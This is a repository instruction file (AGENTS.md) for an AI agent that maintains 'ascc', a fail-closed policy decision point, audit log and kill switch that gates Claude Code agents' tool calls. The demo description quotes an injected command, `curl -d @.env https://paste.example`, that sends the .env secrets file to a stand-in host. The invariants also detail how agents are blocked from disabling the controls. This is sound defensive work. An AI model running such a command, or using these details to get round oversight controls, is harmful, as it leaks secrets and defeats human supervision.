# AGENTS.md

Standing orders for the agent that works this repo, usually the AI-Security-Command-Center Weekly Roadmap
routine (Monday, Wednesday and Friday).

## What ASCC is

AI Security Command Center (`ascc`) is a policy decision point for AI agents. The public MVP is one Go binary:

- `decide` evaluates a request (principal agent, action, resource, context) against Cedar policies in
  `policies/*.cedar` and an agent registry in `ascc.registry.json`. Default deny. Every answer carries the
  determining policy ids and a plain-English reason.
- `hook claude-code` is a Claude Code PreToolUse hook. It reads the hook payload on stdin, maps it to a request
  (`action = "runtime.tool_use"`, `resource = Tool::"claude-code/<tool>"`, parsed command features in context)
  and blocks denied calls. **Any error is a deny.**
- Every decision appends a line to a hash-chained JSONL audit log; `audit verify` names the first line that was
  edited, removed or reordered.
- `kill <agent>` / `revive <agent>` suspend and restore an agent. A suspended agent is denied everything.
  `kill` prints the identities the agent uses; ascc can't stop those, a person rotates or revokes them.
- `posture claude-code` reads the Claude Code settings layers, never writes them, and reports per agent whether
  its hook is registered so that it enforces: in managed settings, matcher `*`, `"onFailure": "block"`, exec
  form, nothing switching it off, binary present.
- `discover` searches a folder for the agent config files it knows and reports every Claude Code setup, hook
  agent and MCP server the registry doesn't list as an `unmonitored` identity with an `ascc/unregistered`
  finding, plus credential-looking variable names as candidate identities. Names only, never a value.
- `inventory` writes the registry as an Agent Security Suite inventory document, each agent labelled
  `enforced`, `observed` or `unmonitored` from the audit log and the posture check, followed by the non-human
  identities the registry declares (`identities`, linked from each agent's `uses`) with `ascc/nhi-*` findings.
  `--import <file>` merges identities from another suite tool's document; what the registry has wins.
- A static demo (`site/`, built to `_site/` by `go run ./src/cmd/buildsite`) runs the same Go core as
  WebAssembly on a planted setup and shows an injected `curl -d @.env https://paste.example` denied on first
  load. The visitor can edit the policy, replay calls, edit the audit log and flip the kill switch.
  `.github/workflows/pages.yml` publishes it from `main` to
  `https://ai-security-command-center-demo.ai-automation-tools.dev/`, after the page test passes.

Public-MVP spec: `docs/product/spec.md`. Slice order: `docs/product/build-plan.md`. Work queue:
`docs/ROADMAP.md`. The full platform design (gateway, STS, egress, broker, plugin host, connectors, console) is
`docs/product/plan/`, A to K; its ADRs in `docs/product/plan/e2-adrs.md` are binding on architecture. A changed
decision goes in as an ADR amendment there, never as a quiet code change.

## Stack

- Go 1.26 (`go.mod`), standard library first. Module path
  `github.com/ai-automation-tools/ai-security-command-center`. Code lives under `src/`: the CLI in
  `src/cmd/ascc/`, packages in `src/internal/<name>/`. Tests are `_test.go` files next to the code, using
  `testing` only (table tests; no testify).
- Cedar via `github.com/cedar-policy/cedar-go` **v1.9.0** (ADR-03), confirmed against the Rust reference in
  `docs/reports/2026-cedar-go-check.md`. It is why `go.mod` says 1.26. Load policies with `NewPolicyListFromBytes` and key each by its `@id` (reject missing or
  duplicate ids). Its schema validator is experimental (`x/exp/schema/validate`): it is called only from
  `newValidator` and `checkPolicy` in `src/internal/pdp/pdp.go`. `santhosh-tekuri/jsonschema/v6` is a test-only
  dependency for the inventory check everywhere except `src/cmd/ascc-schema`, the one place that imports it
  outside a test.
- `schemas/platform/v1alpha1/` holds the platform's JSON Schemas (registry entities, edges, the event envelope,
  both tokens' claims, the plugin manifest, the PDP request and response), written from
  `docs/product/plan/f-data-contracts.md`. `src/cmd/ascc-schema` validates a document against one; it is a
  binary of its own, loads no `$ref` from outside the schema file, refuses duplicate keys and never prints a
  value from the document. A contract change is made in F, then the schema, then its fixtures: every rule has
  an invalid fixture under `fixtures/<schema>/invalid/` named for it, and `go test ./...` runs them all.
- `src/internal/pdp` is the decision point: `registry.go` parses `ascc.registry.json` (agents, and `tools` mapping
  each tool id to its tool groups), `pdp.go` loads policies and decides, `inventory.go` writes the suite document.
  `nhi.go` holds non-human identities: `checkIdentity` is the one check for a registry entry and an imported
  one, and it mirrors the enums in `schemas/agent-inventory.schema.json`. A schema change is made in both.
  `schema.cedar` there is the built-in Cedar schema: a new context feature or entity attribute is added to it
  first, then to the fixtures. `examples/` holds the sample registry, policies, requests and hook payloads the
  tests and the README both run.
- `src/internal/claudecode` maps a PreToolUse payload to a PDP request and parses the command features
  (`path_in_repo`, `network`, `touches_secret_path`, `touches_ascc_state`, `git_push_target`). A new feature gets
  a row in its table test for `Bash` and for `PowerShell`. `src/internal/audit` seals and verifies the chain.
- `src/internal/claudecode/posture.go` is the posture check: settings bytes in, pass or reasons out. It matches
  JSON keys exactly, as Claude Code does, and anything it can't read counts against the agent.
  `src/cmd/ascc/posture.go` reads the settings files and gathers the evidence `inventory` labels from.
- `src/internal/claudecode/discover.go` holds `Locations`, the versioned list of config files `discover` reads,
  and builds its document from their bytes. A new location is added there and `LocationsVersion` changes with
  it. `src/cmd/ascc/discover.go` walks the root.
- `src/cmd/ascc/store.go` is the only place that locks, appends to the audit log or rewrites the registry.
  The lock is a lock file (`<log>.lock`, cleared after 30 s if a hook died holding it): the standard library
  has no portable file lock, and `golang.org/x/sys` isn't worth a dependency for it.
- **The `pdp`, `audit`, `claudecode` and `demo` packages do no I/O.** They take bytes and return values, so the
  WebAssembly demo (`GOOS=js GOARCH=wasm`) imports exactly the code the CLI runs; CI builds them for that
  target. File, stdin and clock access live in `src/cmd/ascc`.
- The demo is three pieces. `src/internal/demo` is the hook, `audit verify` and the kill switch over strings; it
  adds no decision logic, so the page can't answer differently from the CLI. `src/cmd/ascc-wasm` exposes it to
  the page as the global `ascc`. `src/cmd/buildsite` is the build tool: it copies `site/`, embeds the compiled
  WebAssembly in a script so the page never fetches it, and writes `fixtures.js` from `examples/`. `buildsite`
  uses `os/exec` to run `go build`; it is not part of the `ascc` binary. `site/` has no inline script and no
  load from another host, fonts included.
- `src/cmd/ascc-pdp` is the first platform service: `pdp.Decide` behind `POST /pdp/v1/decide`, in the F §6
  shape. It adds no decision logic. Every answer on any path but `/healthz` is a decision, and a deny unless
  the engine said allow: a bad request, a repeated or miscased key, a file that won't load, a panic and a log
  line that can't be written are all denies, each with a test. It reads the files on every request so the
  kill switch needs no restart. It has no caller authentication and no audit chain yet; its guide says so.
- `deploy/compose/` is the development stack (TKT-006): Postgres, Keycloak, OpenBao, Jaeger, `ascc-pdp` and a
  deny-everything Envoy as the egress placeholder. It is for one developer's machine and its README says so.
  `stack_test.go` there holds its rules and `go test ./...` runs them: every port on `127.0.0.1`, every image
  pinned by digest (a Dockerfile's included), every secret-named variable taken from `.env`, no password in a
  URL, no added
  privilege, nothing mounted from outside the repo, the `sandbox` network internal. A new rule gets a row in
  `TestRulesCatchABrokenFile`. The rule test needs `docker compose`: it skips without it locally and fails
  without it in CI on Linux. `ASCC_COMPOSE_SMOKE=1` starts the stack; CI does, in its own job, with
  throwaway secrets. Every secret the stack has comes from `.env` (Mike, 2026-11-10) and a missing one stops
  it starting; never write one into a file here, print one, or pass one as a process argument.
- `src/spikes/pluginhost` is the TKT-031 prototype of the plugin host, **in a Go module of its own**. It uses
  gRPC and `os/exec`, which the `ascc` binary may never link, so nothing under `src/cmd` or `src/internal`
  imports it and the four verify commands skip it (`gofmt -l .` still covers it). CI runs `go vet ./...` and
  `go test ./...` inside that folder. `pluginv1alpha1/` and `CONTRACT.md` there are generated from
  `proto/plugin.proto`; its README has the command.
- `src/spikes/gatewayrun` is the TKT-001 run, **also a Go module of its own** and for the same reason. Its test
  starts a real agentgateway between a stub MCP server and a stub `ext_mcp` policy service and pins the six
  results in the gateway report to what v1.7.0 does. It needs the release binary named in `ASCC_AGENTGATEWAY`
  and skips without it; CI's `gateway` job downloads the release, checks its SHA-256 and runs it. `extmcp/`
  there is agentgateway's contract and generated code, copied at the tag and changed only by `gofmt`. Moving
  to a later release means the checksum in `ci.yml`, the three copied files and a reread of the report.
- Must build and test on Windows and Linux (CI runs both). Use `path/filepath`, never hard-coded separators.
- Settings and secrets live in `.env` at the repo root, names in `.env.example`; the real environment wins.
  `ascc` has none today; the development stack's four secrets are there. If `ascc` ever needs one, load it
  with a few lines of stdlib parsing and document it in `.env.example`.
  Never tell anyone to set a Windows user environment variable.

## Verify

Run all four from the repo root. All must pass before a PR opens.

```
gofmt -l .        # must print nothing
go vet ./...
go test ./...
go build ./...
```

## Invariants

- **Default deny, fail closed.** No permit, an unknown agent, an unknown tool, a parse error, a missing policy
  file or a panic is a deny with a reason. Every fail-closed path has a test.
- **Cedar skips a policy that errors, so a `forbid` can fail open.** Deny any principal or resource not in the
  registry before evaluating, validate entities and policies against the schema at load, and treat any entry in
  `Diagnostic.Errors` as a deny. Requests R8 and R9 in the cedar-go report are the regression tests.
- **The hook contract is `docs/reports/2026-claude-code-hook-contract.md`.** Deny with exit 0 and the
  `hookSpecificOutput` JSON; an internal error writes stderr and exits 2, never 1. On allow, print nothing, so
  Claude Code's own permission rules still apply. The agent id comes from `--agent` in the hook's `args`, not
  the payload. Setup docs always show matcher `*`, `"timeout": 10` and `"onFailure": "block"`. Normalise
  Windows backslashes and parse `Bash` and `PowerShell` commands alike.
- **The kill switch is not a policy.** `Decide` denies a suspended or retired agent before the engine runs, so
  deleting a rule can't revive one. Don't move that check into a `.cedar` file.
- **Coverage labels are computed from evidence**, never read from the registry. With no hook decision for an
  agent in an audit log that verifies, it is `unmonitored`; with one but no passing posture check, `observed`;
  `enforced` needs both. A posture reason never repeats a settings value other than a matcher.
- **Discovery reads names, never values.** `discover` puts server names, variable names, agent ids and paths
  relative to its root in the document, and nothing else from a config file: no command, argument, URL or
  variable value. A file it can't read is named on stderr and makes the exit code 1; it is never skipped
  in silence.
- **Identities are declared or imported, never trusted.** An identity that breaks the suite schema's rules
  stops the registry loading or the import, and its error names the entry by position without repeating a
  value from it. Nothing in an imported file sets a coverage label, replaces an agent or an identity the
  registry has, or links itself to an agent; it can only lower a label to `unmonitored`. A credential is a
  fingerprint and dates, never the secret, and a fingerprint or credential id that starts like a known token
  is refused.
- **Policy decides, nothing else.** No model call, score or heuristic grants access (ADR-14).
- **No secret at rest.** The audit line stores the tool name, parsed features and a SHA-256 of the raw input,
  never the raw input. A test asserts it.
- **Zero network.** The CLI and the demo make no network calls. For the CLI, `TestBinaryCantOpenASocket` fails
  if the binary ever links `net`, `net/http`, `crypto/tls` or `os/exec`; a dependency that pulls one in can't be
  added. For the demo, `TestBuiltPageRendersWithNoNetwork` builds the site and runs its scripts in Node with
  `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource` and `sendBeacon` stubbed to throw: the page must render
  the planted deny and never call one. The page's content policy sets `connect-src 'none'` as well. That test
  needs `node` on `PATH`: it skips without it locally and fails without it in CI.
- **A call that can't be recorded doesn't happen.** If the audit append fails or can't get the lock, the hook
  exits 2 even when policy said allow.
- **An agent can't switch ascc off.** `touches_ascc_state` covers writes to the registry, policies, audit log
  and Claude Code settings (managed drop-ins included), and `ascc kill`, `revive` or `hook` from a shell. The
  sample policies forbid it for everyone.
- **Never claim coverage it doesn't have.** If the hook can't block a tool, that tool is `observed`, and the
  README's coverage section says so.

## Won't

If a roadmap item seems to need one of these, stop and flag it.

**The `ascc` binary and the demo, always.** These carried from the public-MVP spec and still hold for them:

- **Any network access.** `ascc` and the demo page never open a connection; the two tests under Zero network
  guard it. `ascc` is not a gateway, proxy or broker and never becomes one.

**The platform services, from Slice 5 on** (Mike, 2026-11-10: the public MVP is built, so the Next slices may
use the network). A PDP service, token service, gateway, broker or plugin host is a binary of its own that may
listen and connect. Each one:

- is built on its ADR in `docs/product/plan/e2-adrs.md`, and on an ADR still marked Spike only for the part its
  evidence covers;
- lives outside `src/cmd/ascc` and is never imported by it, by `src/internal/pdp`, `audit`, `claudecode` or
  `demo`, so those keep building for WebAssembly;
- listens on loopback or a private Compose network by default, and fails closed like the hook does.

**Everything, always:**

- **Accounts, telemetry, a hosted service or a paid tier.**
- **Committing or printing a secret.** A secret lives in `.env` at the repo root, which git ignores, and
  nowhere else: not in a tracked file, a log, an error message, a fixture or a process argument.
- **Model-based or score-based decisions.**
- **Runtimes other than Claude Code.**
- **Real agents, repos, people or hosts in demo data.** Fictional only (`example.com`, `paste.example`).

## Standards

- Every policy rule and every fail-closed path ships with an allow fixture and a deny fixture.
- Error messages are one line a human can act on, never a stack trace, and never echo a secret.
- No new dependency without a line in the PR body saying why.
- This repo goes public at graduation. Never commit `.env*`, real hook payloads, tokens, real personal data, or
  local paths like `C:\Users\...` or `D:\...`.
- Every deployed page keeps `<meta name="build" content="__BUILD_SHA__">` in `<head>`; the Pages workflow
  replaces it with the commit SHA.
- Docs follow the existing house style: centered header, tables with bold leftmost links, footer nav links.
  Folders and doc file names are lowercase-kebab.
- Commit messages: plain imperative sentences ("Add the decide command"), no Conventional Commit prefixes.

## What "done" means for a roadmap item

1. The item's own text is true of the code, checked by running it.
2. `gofmt -l .` prints nothing and `go vet`, `go test` and `go build` pass; new behaviour has a test.
3. Anything the change made untrue is fixed: `README.md`, `docs/`, this file.
4. `docs/CHANGELOG.md` has a line for it, tagged with the roadmap phase in italics, in the same commit that flips
   the box to `- [x]` with a dated note.
5. It's on a `roadmap/auto-<date>` branch with a PR into `main`. Never push to `main`.
